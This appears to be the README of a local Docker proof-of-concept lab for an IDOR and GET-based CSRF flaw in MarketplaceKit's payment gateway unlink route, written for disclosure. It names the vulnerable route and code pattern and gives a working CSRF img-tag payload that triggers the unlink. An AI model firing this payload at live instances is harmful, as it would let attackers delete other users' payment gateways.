# MarketplaceKit payment gateway unlink IDOR / GET-CSRF PoC

This Docker lab verifies the vulnerable source patterns at commit
`534aa0eb9981a42115bb139f79ae5433b4483a05` and safely reproduces the IDOR logic with a local SQLite database.

It does not contact any real payment provider and does not require a production MarketplaceKit instance.

## Build

```bash
docker build -t marketplacekit-unlink-idor-poc .
```

## Run

```bash
docker run --rm marketplacekit-unlink-idor-poc
```

Expected success markers:

```text
[+] Source-level vulnerable pattern confirmed.
[+] IDOR reproduced: Bob's unlink operation deleted Alice's payment gateway through the unscoped provider relation.
[+] GET-CSRF condition: the real route is a GET URL, so an authenticated browser can trigger it with an image/link request.
```

## What the lab verifies

The lab first checks the checked-out MarketplaceKit source for:

- `GET /account/payments/{id}/unlink`
- unscoped `PaymentProvider::identifier()` relation
- vulnerable `BankAccountController@unlink` flow
- `PaymentGateway` ownership via `user_id`

Then it creates a local SQLite proof database:

- Alice victim owns `payment_gateways.id = 10` for `paypal`
- Bob attacker is authenticated as user id 2
- Bob selects shared provider id 2
- the vulnerable unlink flow resolves `identifier` by provider key only and deletes Alice's gateway

## CSRF proof

`poc/csrf.html` shows the browser-side GET-trigger pattern:

```html
<img src="http://127.0.0.1:8000/account/payments/2/unlink" alt="">
```

This demonstrates why a destructive unlink operation must not use GET and should be protected with Laravel CSRF validation.
